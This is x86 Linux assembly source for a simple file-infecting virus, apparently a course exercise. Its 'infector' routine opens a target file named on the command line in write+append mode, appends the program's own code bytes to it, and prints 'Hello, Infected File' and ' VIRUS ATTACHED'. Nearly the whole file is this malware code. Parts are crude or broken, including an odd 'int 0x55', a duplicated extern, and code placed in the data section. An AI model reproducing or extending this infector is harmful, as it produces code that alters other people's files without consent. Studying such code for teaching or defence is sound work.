section .text
    global _start
    global system_call
    global infector

    extern strlen
    extern strlen
    extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
       
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
section .data
    infected: db "Hello, Infected File", 10
    error: db "Error opening the file", 10
    virus: db " VIRUS ATTACHED", 10
     enter: db "", 10
    argc: dd 0
    outfile: dd 1
    fileName: dd 0

main1:
    mov dword [argc], ecx
    mov edi, 0 ; counter to argc
    call infection;
    call infector
 ;   jmp finish



;check_minuse:
;    cmp byte [edx+1],'a'
;    je get_arg
;    jmp while1
;get_arg:
;    inc edx
;    inc edx
;    jmp open

infector:
    call infection
;next:
 ;   mov edx, [esi+4*edi]
 ;   cmp byte [edx],'-'  ;if - check all the options
 ;   je check_minuse
 ;   
;while1:
;    inc edi;
;    dec dword[argc]
;    jnz next ; loop if not zero
open:
    mov edx, [esp+4]
    mov [fileName], edx
    push edx
   ; call infection
    call strlen
   ;  call infection
    add esp, 4
    push eax
    push dword[fileName] 
    push dword[outfile]
    push 4
    call system_call
    add esp, 16
    push 1
    push enter
    push dword[outfile]
    push 4
    call system_call
    add esp, 16
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push 0644
    push 2001o ; WRITE + APPEND
    push dword[fileName]
    push 5 ; READ
    call system_call
    add esp, 16

    cmp eax, 0
    jl print_error
  
write:
    mov ebx, eax
    push finish-main1 ; size
    push main1
    push ebx ; fileName
    push 4 ; WRITE
    call system_call
    add esp, 16

close:
    mov eax, 6
    int 0x80
    call print_virus_attach
ret


print_error:
    mov eax, 4
    mov ebx, 1
    mov ecx, error
    mov edx, 23
    int 0x55

infection:
    push 21
    push infected
    push dword[outfile]
    push 4
    call system_call
    add esp, 16
    ret

print_virus_attach:
    push 16
    push virus
    push dword[outfile]
    push 4
    call system_call
    add esp, 16
    ret
   

finish:
    ;exit the program
    mov eax, 1      ;sys_exit
    mov ebx, 0      ;success
    int 0x80